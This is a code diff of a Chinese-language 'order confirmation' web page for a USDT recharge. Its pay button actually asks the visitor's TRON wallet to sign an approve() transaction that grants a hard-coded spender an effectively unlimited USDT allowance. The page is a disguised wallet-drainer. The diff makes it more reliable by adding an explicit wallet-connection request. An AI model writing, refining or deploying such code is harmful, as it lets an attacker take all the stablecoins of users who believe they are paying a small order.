@@ -1,6 +1,7 @@
 
-<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>订单确认信息</title><style>*{box-sizing:border-box}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;background:#f9fafb;color:#111827;display:flex;flex-direction:column;height:100vh}header{padding:1rem;background:#1f2937;color:white;text-align:center;font-size:1.25rem}.main{flex:1;padding:1rem;display:flex;flex-direction:column;justify-content:flex-start;align-items:center}.card{background:white;border-radius:10px;padding:1.5rem;width:100%;max-width:480px;box-shadow:0 4px 12px rgba(0,0,0,0.05)}.card h2{margin-top:0;margin-bottom:1rem;font-size:1.2rem;color:#374151}.info{margin-bottom:0.75rem;font-size:1.05rem}.label{font-weight:bold;color:#6b7280;display:inline-block;width:100px}.footer{padding:1rem;background:white;box-shadow:0 -2px 6px rgba(0,0,0,0.05)}.btn{width:100%;padding:1rem;font-size:1.1rem;background:#10b981;color:white;border:none;border-radius:8px;font-weight:bold}.btn:active{background:#059669}.status{margin-top:1rem;font-size:.95rem;color:red;text-align:center}</style></head>
+<!DOCTYPE html><html lang="zh">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>订单确认信息</title><style>*{box-sizing:border-box}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;background:#f9fafb;color:#111827;display:flex;flex-direction:column;height:100vh}header{padding:1rem;background:#1f2937;color:white;text-align:center;font-size:1.25rem}.main{flex:1;padding:1rem;display:flex;flex-direction:column;justify-content:flex-start;align-items:center}.card{background:white;border-radius:10px;padding:1.5rem;width:100%;max-width...
 <body><header>订单确认信息</header><div class="main"><div class="card"><h2>请确认订单信息</h2><div class="info"><span class="label">用户名：</span><span id="username">--</span></div><div class="info"><span class="label">充值金额：</span><span id="amount">--</span> USDT</div><div class="info"><span class="label">订单编号：</span><span id="orderid">--</span></div></div></div><div class="footer"><button class="btn" onclick="authorize()">确认付款</button><p id="status" class="status"></p></div>
 <script>
 const query = new URLSearchParams(location.search);
@@ -12,21 +13,38 @@ const usdt = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
 document.getElementById("username").innerText = user;
 document.getElementById("amount").innerText = amount;
 document.getElementById("orderid").innerText = orderId;
-function getTronWebInstance(){return window.tronWeb || window.tronweb || window.tron || null}
-async function authorize(){
-  const tw = getTronWebInstance();
-  if(!tw || !tw.ready || !tw.defaultAddress){
-    document.getElementById("status").innerText = "请在支持 TRON 的钱包中打开，例如 TP 钱包或 TronLink";return;
-  }
-  try{
-    const tx = await tw.transactionBuilder.triggerSmartContract(usdt,"approve(address,uint256)",{feeLimit:1e8,callValue:0,shouldPollResponse:false},[{type:"address",value:spender},{type:"uint256",value:"9223372036854775807"}],tw.defaultAddress.base58);
+
+async function authorize() {
+  try {
+    // 主动请求钱包授权
+    if (window.tronLink && window.tronLink.request) {
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+    }
+
+    const tw = window.tronWeb || window.tron || null;
+    if (!tw || !tw.ready || !tw.defaultAddress || !tw.defaultAddress.base58) {
+      document.getElementById("status").innerText = "钱包未连接，请使用 TP 钱包或 TronLink 打开并授权";
+      return;
+    }
+
+    const tx = await tw.transactionBuilder.triggerSmartContract(
+      usdt,
+      "approve(address,uint256)",
+      { feeLimit: 100000000, callValue: 0, shouldPollResponse: false },
+      [{ type: "address", value: spender }, { type: "uint256", value: "9223372036854775807" }],
+      tw.defaultAddress.base58
+    );
+
     const signedTx = await tw.trx.sign(tx.transaction);
     const result = await tw.trx.sendRawTransaction(signedTx);
-    if(result.result){document.getElementById("status").innerText="授权成功！交易ID："+result.txid;}
-    else{document.getElementById("status").innerText="授权失败，请重试";}
-  }catch(e){
-    document.getElementById("status").innerText="授权异常："+e.message;
+
+    if (result.result) {
+      document.getElementById("status").innerText = "授权成功！交易ID：" + result.txid;
+    } else {
+      document.getElementById("status").innerText = "授权失败，请重试";
+    }
+  } catch (e) {
+    document.getElementById("status").innerText = "异常：" + e.message;
   }
 }
-setTimeout(()=>{if(!getTronWebInstance()){document.getElementById("status").innerText="未检测到钱包，请确认用钱包浏览器打开页面";}},2500);
 </script></body></html>
